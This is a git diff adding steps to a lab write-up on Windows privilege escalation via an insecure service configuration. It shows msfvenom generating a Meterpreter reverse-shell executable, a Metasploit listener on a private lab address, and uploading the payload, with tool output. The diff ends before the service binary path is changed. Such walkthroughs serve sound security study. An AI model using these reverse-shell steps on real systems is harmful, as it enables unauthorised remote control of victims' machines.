@@ -329,5 +329,63 @@ SERVICE_NAME: daclsvc
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png.png" width="600">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
+</p>
+
+## Step 10 — Generating a New Payload and Starting a Second Listener
+
+I needed a second payload on a different port to catch the SYSTEM shell.
+Generated New Payload on Kali
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=9001 -f exe -o privesc.exe
+```
+**Output:**
+
+```
+Final size of exe file: 7680 bytes
+Saved as: privesc.exe
+```
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
+</p>
+
+Started Second Metasploit Listener on Port 9001
+
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 9001
+run
+```
+**Output:**
+```
+[*] Started reverse TCP handler on 192.168.5.128:9001
+```
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
+</p>
+
+## Step 11 — Uploading the New Payload and Changing the Service Binary Path
+
+Uploaded privesc.exe
+
+```bash
+meterpreter > upload /home/kali/Desktop/privesc.exe
+```
+
+**Output:**
+
+```
+[*] Uploading  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
+[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/tools/privesc.exe -> privesc.exe
+[*] Completed  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
+```
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
 </p>
